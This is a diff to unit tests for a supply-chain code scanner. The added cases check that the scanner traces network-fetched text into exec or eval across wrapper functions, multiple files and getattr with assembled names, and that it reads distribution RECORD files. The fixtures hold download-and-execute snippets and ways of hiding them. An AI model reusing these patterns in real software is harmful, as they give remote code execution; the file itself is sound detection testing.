@@ -286,6 +286,44 @@ ADVERSARIAL = [
          "run.js": "const { bus } = require('./net'); /* \U0001f600 */ bus.on('code', (c) => eval(c));\n"}),
      [("run.js", RECEIVED)]),
 ]
+# The detection round: a runner behind another function (one that hands its
+# parameter on), more than four hops, and a getattr whose name the file
+# builds of what it holds.
+def _hops(n):
+    files, prev = {"pkg/_net.py": PY_NET}, ("._net", "pull")
+    for i in range(n):
+        files[f"pkg/h{i}.py"] = f"from {prev[0]} import {prev[1]}\n\ndef f{i}():\n    return {prev[1]}()\n"
+        prev = (f".h{i}", f"f{i}")
+    files["pkg/run.py"] = f"from {prev[0]} import {prev[1]}\nexec({prev[1]}())\n"
+    return py(files)
+
+
+RUNNER_PY = "def run(code):\n    exec(code)\n"
+GO_PY = "import requests\nfrom .mid import go\ngo(requests.get(" + U + ").text)\n"
+ADVERSARIAL += [
+    ("a runner behind another function", py({"pkg/util.py": RUNNER_PY, "pkg/mid.py": "from .util import run\n\ndef go(c):\n    run(c)\n",
+                                             "pkg/__init__.py": GO_PY}), [("pkg/__init__.py", RUN_THERE)]),
+    ("a runner behind a function of its own file",
+     py({"pkg/mid.py": RUNNER_PY + "\ndef go(c):\n    return run(c)\n", "pkg/__init__.py": GO_PY}), [("pkg/__init__.py", RUN_THERE)]),
+    ("a runner two functions deep", py({"pkg/util.py": RUNNER_PY, "pkg/one.py": "from .util import run\n\ndef hand(c):\n    run(c)\n",
+                                        "pkg/mid.py": "from . import one\n\ndef go(c):\n    one.hand(c)\n", "pkg/__init__.py": GO_PY}),
+     [("pkg/__init__.py", RUN_THERE)]),
+    ("a JavaScript runner behind another function",
+     js({"util.js": "exports.execute = (code) => eval(code);\n",
+         "mid.js": "const { execute } = require('./util');\nfunction go(c) {\n  return execute(c);\n}\nmodule.exports = { go };\n",
+         "index.js": "const { go } = require('./mid');\nfetch(" + U + ").then((r) => r.text()).then((c) => go(c));\n"}),
+     [("index.js", RUN_THERE)]),
+    ("six files deep", _hops(6), [("pkg/run.py", RECEIVED)]),
+    ("getattr with a name held in a constant",
+     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nNAME = 'pull'\nexec(getattr(_net, NAME)())\n"}),
+     [("pkg/run.py", RECEIVED)]),
+    ("getattr with a name in pieces",
+     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nexec(getattr(_net, 'pu' + \"ll\", None)())\n"}),
+     [("pkg/run.py", RECEIVED)]),
+    ("getattr with a constant and a piece",
+     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nHEAD = 'p' + 'u'\nexec(getattr(_net, HEAD + 'll')())\n"}),
+     [("pkg/run.py", RECEIVED)]),
+]
 # Crafted false positives: each looks like a flow and is not one.
 ADVERSARIAL_QUIET = [
     ("an emitted constant", js({"net.js": "const E = require('events');\nconst bus = new E();\nfetch(" + U + ");\n"
@@ -339,9 +377,21 @@ ADVERSARIAL_QUIET = [
     ("getattr's value parsed", py({"pkg/_net.py": PY_NET, "pkg/run.py": "import json\nfrom . import _net\n"
                                                                         "x = getattr(_net, 'pull')()\njson.loads(x)\n"})),
 ]
+ADVERSARIAL_QUIET += [
+    ("a function that does not hand its parameter on",
+     py({"pkg/util.py": RUNNER_PY, "pkg/mid.py": "from .util import run\n\ndef go(c):\n    run('print(1)')\n    return len(c)\n",
+         "pkg/__init__.py": GO_PY})),
+    ("getattr with a name given twice",
+     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nNAME = 'pull'\nNAME = input()\nexec(getattr(_net, NAME)())\n"})),
+    ("getattr with a parameter's name",
+     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\ndef f(name):\n    exec(getattr(_net, name)())\n"})),
+    ("getattr with a name that is no name",
+     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nexec(getattr(_net, 'pu' + '-ll')())\n"})),
+]
 # Known misses, kept here so a change that reads them is noticed (see docs/DESIGN.md §12):
-# two top-level modules of site-packages (in a --deps scan they may be two
-# distributions; a registry scan reads them as one).
+# two top-level modules of site-packages no RECORD lists together (in a
+# --deps scan they may be two distributions; a registry scan reads them as
+# one; the detection round reads a distribution's: _xf_site_groups).
 KNOWN_MISSES = [
     ("two top-level modules", py({"a.py": PY_NET, "b.py": "from a import pull\nexec(pull())\n"})),
 ]
@@ -394,6 +444,14 @@ class CrossFileFollowerTests(unittest.TestCase):
         got = core._cross_file_received_issues(files, one_package=True, who=lambda p: p.split("/")[-1])
         self.assertTrue(got[0]["msg"].startswith("b.py runs code it receives over the network;"), got)
 
+    def test_a_distributions_top_level_modules(self):
+        """site_groups (the detection round): the modules one distribution's
+        RECORD lists are one package in a --deps scan."""
+        files = py({"a.py": PY_NET, "b.py": "from a import pull\nexec(pull())\n", "c.py": "x = 1\n"})
+        groups = {"site-packages/a.py": "site-packages/x-1.0.dist-info", "site-packages/b.py": "site-packages/x-1.0.dist-info"}
+        self.assertEqual(found_full(files, site_groups=groups), [("b.py", RECEIVED)])
+        self.assertEqual(found_full(files), [])
+
     def test_a_file_that_shows_it_alone_is_left_to_the_single_file_test(self):
         files = py({"pkg/_net.py": PY_NET, "pkg/run.py": "import requests\nfrom ._net import pull\n"
                                                          "exec(requests.get(" + U + ").text)\n"})
@@ -403,6 +461,73 @@ class CrossFileFollowerTests(unittest.TestCase):
     def test_skip_paths(self):
         files = py({"pkg/_net.py": PY_NET, "pkg/__init__.py": "from ._net import pull\nexec(pull())\n"})
         self.assertEqual(found_full(files, skip_paths={"site-packages/pkg/__init__.py"}), [])
+
+
+class SiteGroupTests(unittest.TestCase):
+    """_xf_site_groups: the top-level modules and packages a distribution's
+    .dist-info/RECORD lists together, read from the disk of a --deps scan."""
+
+    def setUp(self):
+        import tempfile
+        self.tmp = tempfile.TemporaryDirectory()
+        self.root = self.tmp.name
+        self.site = "venv/lib/python3.12/site-packages"
+
+    def tearDown(self):
+        self.tmp.cleanup()
+
+    def write(self, rel, text):
+        import os
+        path = os.path.join(self.root, *(self.site + "/" + rel).split("/"))
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(text)
+
+    def files(self, rels):
+        return [{"path": self.site + "/" + r, "lang": "py", "dep": True, "content": "x = 1\n"} for r in rels]
+
+    def groups(self, rels):
+        return {k[len(self.site) + 1:]: v[len(self.site) + 1:] for k, v in
+                core._xf_site_groups(self.root, self.files(rels)).items()}
+
+    def test_a_record_joins_what_it_lists(self):
+        self.write("x-1.0.dist-info/RECORD", "a.py,sha256=1,2\nb.py,,\npkg/__init__.py,,\nx-1.0.dist-info/RECORD,,\n"
+                                             "../../../bin/x,,\n__pycache__/a.cpython-312.pyc,,\n")
+        rels = ["a.py", "b.py", "pkg/__init__.py", "c.py"]
+        self.assertEqual(self.groups(rels), {"a.py": "x-1.0.dist-info", "b.py": "x-1.0.dist-info",
+                                             "pkg/__init__.py": "x-1.0.dist-info"})
+
+    def test_two_records_that_share_a_name_join_all(self):
+        self.write("a-1.dist-info/RECORD", "a.py,,\nb.py,,\n")
+        self.write("b-1.dist-info/RECORD", "b.py,,\nc.py,,\n")
+        self.assertEqual(set(self.groups(["a.py", "b.py", "c.py"]).values()), {"a-1.dist-info"})
+
+    def test_what_is_no_group(self):
+        # a namespace package two distributions share, each listing one name; a RECORD that is a link or too long
+        import os
+        self.write("g1-1.dist-info/RECORD", "ns/one/__init__.py,,\n")
+        self.write("g2-1.dist-info/RECORD", "ns/two/__init__.py,,\n")
+        self.assertEqual(self.groups(["ns/one/__init__.py", "ns/two/__init__.py", "top.py"]), {})
+        self.write("elsewhere/RECORD", "top.py,,\nns/one/__init__.py,,\n")
+        site = os.path.join(self.root, *self.site.split("/"))
+        try:
+            os.symlink(os.path.join(site, "elsewhere"), os.path.join(site, "link-1.dist-info"))
+        except (OSError, NotImplementedError):
+            self.skipTest("no symbolic links here")
+        self.assertEqual(self.groups(["ns/one/__init__.py", "top.py"]), {})
+        self.write("big-1.dist-info/RECORD", "top.py,,\nns/one/__init__.py,,\n")
+        from unittest import mock
+        with mock.patch.object(core, "_XF_RECORD_BYTES", 10):
+            self.assertEqual(self.groups(["ns/one/__init__.py", "top.py"]), {})
+        self.assertEqual(set(self.groups(["ns/one/__init__.py", "top.py"]).values()), {"big-1.dist-info"})
+
+    def test_a_deps_scan_reads_a_distribution(self):
+        self.write("a.py", PY_NET)
+        self.write("b.py", "from a import pull\nexec(pull())\n")
+        self.write("x-1.0.dist-info/RECORD", "a.py,,\nb.py,,\n")
+        res = core.scan_project(self.root, include_deps=True)
+        got = [(i["file"].replace("\\", "/"), i["sev"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]
+        self.assertEqual(got, [(self.site + "/b.py", "CRITICAL")])
 
 
 if __name__ == "__main__":
